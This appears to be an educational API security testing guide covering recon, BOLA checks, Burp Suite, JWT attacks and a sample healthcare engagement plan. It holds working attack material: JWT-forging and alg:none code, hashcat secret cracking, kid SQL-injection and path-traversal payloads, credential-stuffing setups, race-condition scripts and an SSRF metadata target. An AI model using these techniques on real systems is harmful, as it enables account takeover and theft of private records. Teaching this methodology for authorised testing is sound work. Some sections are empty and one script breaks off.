🟢 Beginner — The Testing Methodology
A structured 5-phase API security testing methodology
Ad-hoc testing finds some bugs by luck. A methodology finds them systematically. Every professional API security engagement follows a structured process. This is the one you will use.
ℹ️
Difference from web app testing: Web app testing starts with a browser. API testing starts with documentation. Before sending a single request, you spend time understanding what the API does, what objects it exposes, what operations it supports, and what the authentication model is. The OpenAPI specification is your map of the entire attack surface.
1
Reconnaissance — Map the attack surface before touching the API
30–60 min
▼

Reconnaissance is everything you learn about an API before sending your first test request. The goal is to understand: what endpoints exist, what objects they expose, what authentication they require, what the data model looks like, and where the interesting business logic lives. Skipping recon means testing blindly and missing entire attack surfaces.

Recon checklist — do all of these before testing
SourceWhat to findHow to find it
OpenAPI / Swagger spec Every endpoint, parameter, data type, authentication requirement Try: /openapi.json, /swagger.json, /api-docs, /v1/docs, /swagger-ui.html, /.well-known/openapi
JavaScript bundles Hardcoded API endpoints, internal routes not in the spec Open browser DevTools → Sources → search for /api/ in JS files. Use linkfinder tool to extract URLs from minified JS.
Mobile app API endpoints, authentication tokens, internal URLs Decompile Android APK with jadx. Intercept iOS traffic with Burp + mitmproxy. Strings extraction: strings app.apk | grep https://
Network traffic Actual requests made by the app during normal usage Proxy browser through Burp Suite. Browse all app features. Every request that hits the API is captured and added to your test scope.
Error responses Framework version, stack traces, field names, DB schema hints Send malformed requests (wrong content-type, missing required fields, SQL characters). Read error messages carefully.
Git / public repos Hardcoded API keys, internal endpoint names, auth tokens Search GitHub for company name + "api_key" or "internal_api". Check commit history if repo is public. 
# Reading an OpenAPI spec to build your attack plan

# 1. List all endpoints and their HTTP methods
$ cat openapi.json | jq '.paths | keys[]'
"/api/v1/users/{user_id}"
"/api/v1/users/{user_id}/orders"
"/api/v1/admin/users"
"/api/v1/payments/transfer"

# 2. Find endpoints with path parameters (BOLA candidates)
$ cat openapi.json | jq '.paths | to_entries[] | select(.key | contains("{")) | .key'
"/api/v1/users/{user_id}"         # ← test BOLA: can you access other users?
"/api/v1/orders/{order_id}"        # ← test BOLA: can you access other orders?
"/api/v1/documents/{doc_id}"       # ← test BOLA: can you access other documents?

# 3. Find endpoints with no security defined (auth bypass candidates)
$ cat openapi.json | jq '.paths | to_entries[] |
  select(.value | to_entries[] | .value | has("security") | not) | .key'
"/api/v1/admin/users"              # ← NO security defined! → test unauthenticated access
"/api/v1/internal/config"          # ← missing security → potential BFLA

# 4. Find endpoints accepting file uploads (path traversal, malware upload)
$ cat openapi.json | jq '.. | objects | select(.type=="string" and .format=="binary") | ..'

Authentication & Authorisation Testing
Most impactful phase
▼

Authentication testing asks: can I skip authentication entirely? Can I use someone else's credentials? Can I forge my own tokens? Authorisation testing asks: once authenticated, can I access resources that aren't mine, and can I perform actions I shouldn't be able to?

Authentication test checklist
TestHow to perform itPass condition
Access without tokenRemove the Authorization header entirely from authenticated requests401 Unauthorized on all protected endpoints
Expired tokenUse a token from a previous session or manually set exp claim to past time401 Unauthorized — expired tokens rejected
Malformed tokenSend Authorization: Bearer abc123 (not a valid JWT)401 Unauthorized — not 500 Internal Server Error
Wrong signatureModify the JWT payload and keep the original signature401 Unauthorized — signature mismatch detected
Algorithm: noneSet JWT header to alg: none, remove signature401 Unauthorized — alg:none rejected
Weak secret brute-forceRun hashcat or jwt_tool against the JWT HMAC signatureSecret is not in common wordlists (minimum 256-bit random)
Token in URLCheck if any endpoints accept the token as a query parameterTokens only accepted in Authorization header, never URL params
3
Object & Function Level Authorisation (BOLA / BFLA)
Highest impact findings
▼

This phase is the most likely to find critical vulnerabilities. You systematically test every resource endpoint with two accounts to verify that ownership is enforced, and every function endpoint to verify that role checks are in place.

BOLA testing protocol — two-account method
# Setup: two legitimate test accounts
USER_A_TOKEN="eyJhbGciOiJIUzI1NiJ9..."   # alice@test.com
USER_B_TOKEN="eyJhbGciOiJIUzI1NiJ9..."   # bob@test.com

# Step 1: User A creates a resource
$ curl -X POST https://api.target.com/api/v1/documents \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Private Doc","content":"sensitive"}'
# Response: {"id": "doc-uuid-abc123", "owner": "alice"}

# Step 2: User B attempts to read User A's resource
$ curl https://api.target.com/api/v1/documents/doc-uuid-abc123 \
  -H "Authorization: Bearer $USER_B_TOKEN"
# PASS: 403 or 404
# FAIL: 200 OK with Alice's document → BOLA (API1)

# Step 3: User B attempts to UPDATE User A's resource
$ curl -X PATCH https://api.target.com/api/v1/documents/doc-uuid-abc123 \
  -H "Authorization: Bearer $USER_B_TOKEN" \
  -d '{"title":"Hacked"}'
# PASS: 403 or 404
# FAIL: 200 OK → BOLA on write (often missed!)

# Step 4: User B attempts to DELETE User A's resource
$ curl -X DELETE https://api.target.com/api/v1/documents/doc-uuid-abc123 \
  -H "Authorization: Bearer $USER_B_TOKEN"
# PASS: 403 or 404
# FAIL: 200/204 → BOLA on delete

# Automate for ALL endpoints with path parameters using a script

5
Business Logic & Rate Limiting Tests
Unique to each API — most creative phase
▼

Business logic flaws can't be found by automated scanners because they require understanding what the API is supposed to do. The question is: can you use the API in ways the developers didn't intend that produce a harmful outcome?

Business logic test scenarios
ScenarioWhat to testExample attack
Price/amount manipulationCan the client send the price/amount in the request?Send {"amount": -100} to get a refund instead of charge. Send {"quantity": 0} for free items.
Workflow bypassCan you skip required steps in a multi-step process?Complete step 1 (add to cart), then directly call step 3 (confirm order) without step 2 (payment). Does the order confirm?
State machine abuseCan you set an object to an invalid or privileged state?PATCH order status directly to "shipped" without going through "paid" state. PATCH account is_frozen to false on a suspended account.
Coupon/voucher abuseCan you reuse single-use codes or apply them in stacking combinations?Apply the same discount code twice in the same order. Apply multiple codes to get 200% off. Use an expired code.
Race conditionsDoes concurrent execution of the same request produce unexpected results?Send 10 simultaneous transfer requests for the same amount. Do all 10 process? Does balance go negative?
Referral fraudCan you refer yourself and collect the referral bonus?Create account A, use referral code from account A to register account B, claim referral bonus on account A.
# Race condition test with parallel requests
# Test: can a user apply a discount code twice simultaneously?

import threading, requests, time

TOKEN = "your_test_token"
URL   = "https://api.target.com/api/v1/orders/apply-coupon"

results = []

def apply_coupon():
    r = requests.post(URL,
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"coupon_code": "SAVE50", "order_id": "order-abc"}
    )
    results.append(r.status_code)

# Fire 10 simultaneous requests
threads = [threading.Thread(target=apply_coupon) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()

print(results)
# If multiple 200s: race condition! Coupon applied multiple times.
# Expected: only one 200, rest 409 Conflict or 422 Unprocessable

Burp Suite is the professional standard for API security testing. This section covers the workflow, every key tool, and how to use each one effectively against REST APIs.

Burp Suite operates as an intercepting HTTP/HTTPS proxy. Every request from your browser or test scripts flows through it, giving you complete visibility and control. For API testing, you also need to import your OpenAPI spec to give Burp a complete picture of the attack surface.

# 1. Configure proxy: Burp listens on 127.0.0.1:8080
# Browser: Settings → Network → Manual Proxy → 127.0.0.1:8080
# OR use Burp's embedded browser (no config needed)

# 2. Install Burp's CA certificate (for HTTPS interception)
# Navigate to http://burpsuite in your proxied browser → download cert
# Install in browser's certificate store

# 3. Import OpenAPI spec into Burp (gives Burp full endpoint list)
# Target → Site map → right-click → "Load OpenAPI definition"
# OR: Proxy → HTTP history → drag openapi.json to repeater

# 4. Configure scope (critical: only test YOUR API, not third parties)
# Target → Scope → Add: https://api.targetapp.com
# Enable "Show only in-scope items" in HTTP history

# 5. Set up test credentials as a Burp session
# Project options → Sessions → Add session handling rule
# Configure macro to re-authenticate when token expires
# Or: use "Match and Replace" to inject Bearer token into every request
# Proxy → Options → Match and Replace:
#   Type: Request header, Match: ^Authorization:.*
#   Replace: Authorization: Bearer YOUR_TOKEN_HERE

Repeater is your manual testing workbench. You capture a request, send it to Repeater, then modify it and resend as many times as you like, observing the response each time. This is how you manually confirm suspected vulnerabilities, craft escalating payloads, and explore unexpected API behaviour.

# Typical Repeater workflow for BOLA testing:

# 1. Intercept your own profile request in Burp Proxy
GET /api/v1/users/uuid-a1b2c3 HTTP/1.1
Host: api.target.com
Authorization: Bearer USER_A_TOKEN

# Response: {"id":"uuid-a1b2c3","email":"alice@test.com","balance":"1000.00"}

# 2. Send to Repeater (Ctrl+R)
# 3. Change the user ID to a different user's ID
GET /api/v1/users/uuid-x9y8z7 HTTP/1.1    # ← changed to Bob's ID
Authorization: Bearer USER_A_TOKEN        # ← still Alice's token

# 4. Click "Send" and observe response
# PASS: 404 Not Found or 403 Forbidden
# FAIL: 200 OK with {"email":"bob@test.com","balance":"5500.00"} → BOLA!

# 5. Escalate: try admin ID (often "1" or "admin-uuid")
GET /api/v1/users/00000000-0000-0000-0000-000000000001 HTTP/1.1
# Can you read the admin account?

# 6. Test write BOLA with PATCH
PATCH /api/v1/users/uuid-x9y8z7 HTTP/1.1
Authorization: Bearer USER_A_TOKEN
Content-Type: application/json

{"email": "hacked@attacker.com"}          # ← change Bob's email

Intruder automates a single request with a payload list — perfect for BOLA enumeration, credential stuffing, parameter fuzzing, and rate limit testing. You mark injection points with § symbols, choose a payload type, and Intruder iterates through all combinations.

# Intruder configuration for BOLA enumeration

# Base request (from Repeater → right-click → "Send to Intruder"):
GET /api/v1/orders/§ORDER_ID§ HTTP/1.1    # ← § marks injection point
Authorization: Bearer USER_B_TOKEN

# Payload type: Simple List
# Payload source: extract all order IDs you discovered as User A
# Payloads:
order-uuid-001
order-uuid-002
order-uuid-003
# ... (paste from User A's order history)

# Analysis: sort results by Response Length or Status Code
# 200 responses with long bodies = BOLA confirmed
# 404/403 = properly protected

# Intruder attack types:
# Sniper:       one payload list, one position — standard BOLA test
# Battering Ram: same payload in all positions — test where ID appears multiple places
# Pitchfork:    parallel lists — credential stuffing (usernames + passwords)
# Cluster Bomb: all combinations — parameter fuzzing with multiple unknowns

# Rate limit test with Intruder:
POST /api/v1/auth/login HTTP/1.1

{"email":"victim@test.com","password":"§PASSWORD§"}

# Payload: common-passwords.txt (1000 entries)
# Watch for: 200 OK (credential worked) or 429 (rate limit hit)
# If all 1000 return 401 without any 429 → NO RATE LIMITING

Burp Scanner (Pro only) actively tests for injection vulnerabilities, authentication flaws, and misconfigurations. For APIs, you right-click any request in the history and "Actively scan" it, or you run the scanner against your entire in-scope target after the spider has discovered all endpoints.

# Burp Scanner best practices for API testing

# Option 1: Scan a specific endpoint
# Right-click any request in HTTP history → "Scan" → "Active Scan"
# Scanner tests that endpoint for all injection types

# Option 2: Scan all discovered endpoints
# Scanner → New scan → "Crawl and audit"
# Enter starting URL: https://api.target.com
# Scope: include https://api.target.com
# Audit coverage: thorough (slower but finds more)

# Configure scanner for API-specific testing:
# Scanner → Audit options → Insertion points:
#   ✓ Query parameters
#   ✓ Body parameters (JSON)

#   ✓ URL path parameters (e.g., /users/{id})

# NOTE: Burp Scanner will NOT find BOLA — that requires the two-account method
# Scanner finds: SQLi, XSS, XXE, SSRF, command injection, path traversal
# Manual testing finds: BOLA, BFLA, business logic, mass assignment

🟡 Intermediate — JWT Attacks
JWT attacks in full depth
JWT (JSON Web Token) is the most common API authentication mechanism. It has a well-documented set of attack techniques that every AppSec engineer must know how to test for. These attacks are checked manually because automated scanners rarely find them correctly.
Reading JWTs — decode before you attack
Never attack what you haven't read. Always decode the token first.
▼
# A JWT has three base64url-encoded sections separated by dots:
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzA5OTk5OTk5fQ.SIG
# [    HEADER     ]                      [            PAYLOAD             ]   [SIG]

# Decode header (base64url → JSON):
$ echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
{ "alg": "HS256", "typ": "JWT" }
# Note the algorithm: HS256 (symmetric HMAC) vs RS256 (asymmetric RSA)

# Decode payload:
$ echo "eyJzdWIiOiJ1c2VyLTEyMyIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzA5OTk5OTk5fQ" | base64 -d
{
  "sub": "user-123",     # subject (user ID) — can you change this?
  "role": "user",       # role claim — can you change to "admin"?
  "exp": 1709999999    # expiry timestamp — does server check this?
}

# Or use jwt.io in browser to decode visually
# Or use jwt_tool:  python3 jwt_tool.py [TOKEN]

# What to look for when reading a JWT:
# 1. Algorithm: HS256 (HMAC) or RS256 (RSA)? Different attacks apply
# 2. Does the payload contain a "role" or "is_admin" claim?
# 3. Is the sub claim a user ID you can change?
# 4. How far in the future is exp? Short = good security practice
# 5. Are there any sensitive data fields in the payload?
The 5 JWT attack techniques you must be able to test
In order of severity — start with the most impactful
▼

Attack 1 — Algorithm: none (no signature required)

# Tool: jwt_tool or Burp JWT Editor
# Principle: some libraries accept JWT with alg:none and skip signature validation

# Original token: alg=HS256, signed
# Modified header: change alg to "none"
import base64, json

header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=')
forged  = header + b'.' + payload + b'.'   # empty signature
print(forged.decode())

# Send in Authorization header — if server accepts: critical auth bypass
# Mitigation: always specify algorithms=["HS256"] in jwt.decode()

Attack 2 — Weak secret brute-force (HS256 only)

# Tool: hashcat mode 16500 or jwt_tool
# Principle: HS256 signs with a symmetric secret. If the secret is weak, you can brute-force it.

# Option A: hashcat (GPU-accelerated, fastest)
$ hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
eyJ...SIG:secret123  # ← secret found! "secret123" is the HMAC key

# Option B: jwt_tool (Python, simpler)
$ python3 jwt_tool.py [TOKEN] -C -d /usr/share/wordlists/rockyou.txt
[+] secret found: mysecretkey

# Once you have the secret, forge any token:
import jwt
forged = jwt.encode({"sub":"admin", "role":"admin"}, "mysecretkey", algorithm="HS256")
# Now send forged token as any user — full account takeover

# Mitigation: use a cryptographically random 256-bit secret
# import secrets; secrets.token_hex(32)  → 64-character hex string

Attack 3 — Algorithm confusion (RS256 → HS256)

# Tool: Burp JWT Editor or jwt_tool -X k
# Principle: server uses RS256 (asymmetric). Public key is available.
# Change alg to HS256, sign with the PUBLIC KEY as the HMAC secret.
# Vulnerable servers verify HS256 with the public key → accepts forged token.

# Step 1: Get the server's public key
$ curl https://api.target.com/.well-known/jwks.json
# Extract the RSA public key from the "keys" array

# Step 2: In Burp JWT Editor
# Decode your token → change alg to HS256 → change payload claims
# Click "Sign" → select "Sign with public key (for alg confusion)"
# Paste the RSA public key as the HMAC secret

# Step 3: Send the modified token
# If server accepts it: auth bypass via algorithm confusion

# Mitigation: pin algorithm on server side — NEVER accept alg from token

Attack 4 — Claim manipulation (role/sub modification)

# Simplest attack — but only works if signature is not validated
# Decode token → change sub or role in payload → re-encode → send
# If server validates signature: 401. If not (common mistake): works.

# Example: change "role": "user" to "role": "admin"
# If accepted: immediate vertical privilege escalation

# HOW TO TEST: use Burp Repeater
# 1. Intercept a request with your JWT
# 2. In Burp JWT Editor plugin: decode → modify role claim → Forward
# 3. Observe: same response (validation works) vs different response (broken)

Attack 5 — JWT kid injection (key ID parameter injection)

# kid (key ID) header param tells server which key to use for verification
# If kid is used in a SQL or filesystem lookup without sanitisation: injection

# Original header: {"alg":"HS256","kid":"keystore/main.key"}
# Injected header: {"alg":"HS256","kid":"../../dev/null"}
# If server reads /dev/null as the HMAC key → key is empty string ""
# Sign forged token with "" → server verifies with "" → accepts!

# SQL injection variant:
# kid: "a' UNION SELECT 'attacker_secret' --"
# Server looks up key in DB: SELECT key FROM keys WHERE id='a' UNION SELECT 'attacker_secret'--
# Returns 'attacker_secret' as the key → sign token with 'attacker_secret' → accepted

# Test with jwt_tool:
$ python3 jwt_tool.py [TOKEN] -T   # tamper mode — modify kid interactively
🟡 Intermediate — Mass Assignment & Parameter Discovery
Finding and exploiting hidden writable fields
Mass assignment vulnerabilities exist because developers forget to allowlist writeable fields in their serialisers. The attack requires discovering which hidden fields exist. Burp ParamMiner and manual exploration are the primary techniques.
Mass assignment testing — finding the hidden fields
The attack you can only find by trying fields that aren't in the documentation
▼

🟡 Intermediate — Real Test Cases
A full API security test case library
These are the specific test cases you execute during an API security engagement. Each one maps to an OWASP API category, has a clear pass/fail criterion, and documents exactly how to perform it.
TC-01: Unauthenticated access to all endpoints
API1, API5 • OWASP API Security • Priority: Critical • Time: 15 min
CRITICAL
Objective

Verify that every API endpoint requires authentication. Discover endpoints accessible without a valid token. Map all endpoints that return data without credentials.

Steps
# 1. Export all discovered URLs from Burp HTTP history
# Target → Site map → right-click target → "Copy URLs in this host"

# 2. Replay every request WITHOUT the Authorization header
$ while IFS= read -r url; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$url")
    echo "$STATUS $url"
  done < all_api_urls.txt | grep "^2"    # show only 2xx responses

# 3. Note any 200 responses — these are endpoints with no auth
# 4. For each unauth endpoint: what data is returned? Is it sensitive?
# 5. Test HTTP methods: some APIs protect GET but not POST/PUT/DELETE
$ curl -X DELETE https://api.target.com/api/v1/users/123   # no token!
Pass / Fail

Pass: All endpoints return 401 Unauthorized without a valid token (except intentionally public endpoints like /health, /login, /register). Fail: Any endpoint returns 200 with sensitive data without authentication.

TC-02: BOLA — Cross-account object access (all HTTP methods)
API1 • Two accounts required • Priority: Critical • Time: 45 min
CRITICAL
Objective

Verify that every resource endpoint enforces ownership. User A must not be able to read, modify, or delete resources owned by User B using User A's valid authentication token.

Steps
# Automated BOLA test script — runs for ALL endpoints with path params
import json, requests

# Load OpenAPI spec and find all endpoints with path parameters
spec = json.load(open("openapi.json"))
path_param_endpoints = [
    path for path in spec["paths"]

API security testing interview questions
Questions you will face in security engineer and AppSec interviews when the topic is API testing methodology
Q1. You are testing a REST API and every endpoint uses UUID v4 identifiers instead of sequential integers. Does this eliminate BOLA risk? Explain your answer.
Yes — UUIDs are unguessable so BOLA is impossible without knowing another user's resource ID
Yes — UUIDs combined with authentication completely prevent BOLA
No. UUIDs eliminate enumeration but BOLA still exists if the server doesn't check ownership. An attacker who obtains another user's UUID (from a leaked URL, a shared document link, an API that returns IDs in a list response) can still access that resource. BOLA requires both: UUID IDs (prevents enumeration) AND server-side ownership check (prevents access).
No — UUIDs make BOLA worse because they're harder to test
UUIDs are a defence-in-depth measure, not a complete fix. They prevent brute-force enumeration (the automated attack that extracted 11M Optus records). But if an attacker has any way to learn a UUID — it appears in an email notification, a shared link, a list endpoint that leaks other users' IDs, or from a leak elsewhere — they can use it. The only complete fix for BOLA is a server-side ownership check on every resource operation: Order.objects.get(id=id, user=request.user). UUIDs + ownership check = properly protected.
Q2. During API testing, you notice that the login endpoint returns a different error message for "user not found" vs "wrong password." What vulnerability does this indicate and how would you exploit it?
SQL injection — different error messages indicate the query is being parsed differently
User enumeration (API2 Broken Authentication). Different messages tell an attacker which email addresses have accounts. Exploitation: use a wordlist of email addresses and send login requests. Emails that get "wrong password" = valid accounts. Use those accounts for targeted credential stuffing with known breached passwords.
BOLA — the server is returning data about other users
Rate limiting bypass — different responses indicate different code paths
User enumeration is a classic API2 (Broken Authentication) finding. The attacker uses the login error message as an oracle: send "test@gmail.com" and get "User not found" = this email has no account. Send "victim@gmail.com" and get "Invalid password" = this email HAS an account. The attacker can now target that account specifically with credential stuffing (trying breached passwords). Fix: always return the same generic message: "Invalid email or password" regardless of which check failed. Also ensure the response time is identical (bcrypt should run regardless of whether the user exists to prevent timing attacks).
Q3. You are testing an API that has rate limiting: it allows 5 failed login attempts per IP before blocking. You send the X-Forwarded-For: 1.2.3.4 header and notice the rate limit counter resets. What is this called and what is the correct fix?
IP spoofing — the server should validate the source IP address at the network layer
Header injection — the X-Forwarded-For header should be stripped at the WAF
Rate limit bypass via IP header manipulation. The API trusts client-supplied X-Forwarded-For as the real IP. Fix: rate limit by BOTH account (email) AND IP. Account-level rate limiting prevents this bypass entirely — attacker can't change what account they're targeting. IP-based limiting should only use the real IP from a trusted reverse proxy, not the client-supplied header.
This is expected behavior — X-Forwarded-For is a legitimate way to handle proxy networks
This is one of the most common rate limiting bypasses. The fix has two parts: (1) Account-level rate limiting: limit failed attempts PER ACCOUNT (email address), not just per IP. Even with rotating IPs, the attacker still targets the same account. This is the more important control. (2) Trusted IP extraction: if you need IP-based limiting, only trust the X-Forwarded-For from your own reverse proxy (Nginx/load balancer), not from the client. In Django: TRUSTED_PROXY_LIST = ['10.0.0.1'] and only use XFF header if the request came from a trusted proxy.

Phase 1 — Reconnaissance (Day 1, 4 hours):
Start with the publicly accessible OpenAPI spec at /api/docs. Use jq to extract all 300 endpoints, identify every path parameter (BOLA candidates), find endpoints with no security definition (auth bypass candidates), and list all PATCH/PUT/POST endpoints (mass assignment targets). Download the Play Store APK and decompile with jadx to find any API endpoints not in the spec (shadow APIs, internal debug endpoints). Proxy the React web app through Burp and browse all features as both patient and doctor roles to capture real request/response traffic. Check for /api/v2/ endpoints — whether v1 has fewer security controls is high priority.

Phase 2 — Authentication (Day 1-2, 3 hours):
Healthcare context makes this critical: a doctor token that can be used as an admin, or a patient token that can act as a doctor, has severe implications. Decode the JWT with jwt_tool — check the algorithm (HS256 vs RS256), claims (role, patient_id, doctor_id), and expiry. Test alg:none, run hashcat against the HMAC signature if HS256. Test role claim modification: change "role":"patient" to "role":"doctor" or "role":"admin". Test expired token acceptance. Test whether doctor endpoints reject patient tokens and vice versa.

Phase 3 — BOLA/BFLA (Day 2-3, full day):
Most critical phase for healthcare. BOLA here means Patient A can access Patient B's medical records, prescriptions, and billing data. Use the Burp Autorize extension: configure the patient token as the "lower privilege" token, browse as the doctor account, and Autorize automatically replays every doctor request with the patient token. Any 200 response = BOLA. Also test: can a patient access any doctor's appointment schedule? Can a patient modify their own prescription? Can a patient access another patient's billing records? Test all HTTP methods (GET, PATCH, PUT, DELETE) on every resource endpoint.

Phase 4 — Injection (Day 3-4, 3 hours):
Priority targets: the prescription search endpoint (SQL query on medication names), the appointment notes field (free text saved to DB), the document upload endpoint (file path in POST body — path traversal), the webhook/notification URL field (SSRF to internal services or AWS metadata). Run Burp Scanner on all endpoints. Manually test the prescription search with SQLi payloads and SSTI payloads (if it uses a template for results). Test the webhook URL with 169.254.169.254 for SSRF.

Phase 5 — Business Logic (Day 4-5, 3 hours):
Healthcare-specific business logic tests: Can a patient create an appointment without going through the scheduling flow? Can a patient mark their own appointment as "completed" (which might trigger a billing event)? Can a patient set their own prescription as "refillable:true"? Can a patient change their doctor assignment directly? Can the billing API be called with amount=0 or amount=-1? Test race conditions on appointment booking (double-booking the same slot). Test whether the /api/v2/ beta endpoints have the same auth controls as v1 — often they don't.

1. API9 (High): v1 endpoints still active alongside v2 with potentially fewer controls. OpenAPI spec publicly accessible — entire attack surface mapped for any attacker.
2. API1 (Critical): BOLA on patient records. Healthcare SaaS with no previous testing almost certainly has missing ownership checks on at least some endpoints.
